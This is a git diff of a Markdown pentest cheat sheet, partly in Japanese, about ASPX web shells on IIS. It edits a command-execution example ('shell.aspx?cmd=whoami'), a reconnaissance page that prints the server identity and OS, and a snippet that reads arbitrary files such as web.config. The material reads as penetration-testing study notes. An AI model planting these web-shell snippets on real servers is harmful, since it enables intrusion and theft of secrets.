@@ -390,7 +390,7 @@ Response.Write(
 http://target/shell.aspx?cmd=whoami
 ```
 
-### ターゲット状態確認
+### Identify Target
 
 ```aspx
 <%@ Page Language="C#" %>
@@ -398,11 +398,9 @@ http://target/shell.aspx?cmd=whoami
 <%@ Import Namespace="System.IO" %>
 
 User: <%= WindowsIdentity.GetCurrent().Name %><br>
-Auth: <%= User.Identity.IsAuthenticated %><br>
 Machine: <%= Environment.MachineName %><br>
 OS: <%= Environment.OSVersion %><br>
 64bit: <%= Environment.Is64BitOperatingSystem %><br>
-CLR: <%= Environment.Version %><br>
 AppPool Identity: <%= WindowsIdentity.GetCurrent().Name %><br>
 Current Dir: <%= Directory.GetCurrentDirectory() %><br>
 ```
@@ -412,10 +410,10 @@ Current Dir: <%= Directory.GetCurrentDirectory() %><br>
 ```aspx
 <%@ Page Language="C#" %>
 <%@ Import Namespace="System.IO" %>
-<%= File.ReadAllText(@"C:\inetpub\web.config") %>
+<%= File.ReadAllText(@"<file_path>") %>
 ```
 
-### 重要ファイル（Windows + IIS）
+#### 重要ファイル（Windows + IIS）
 
 | パス                                                        | 内容            | ペンテスト的に嬉しいポイント                                                    |
 | --------------------------------------------------------- | ------------- | ----------------------------------------------------------------- |
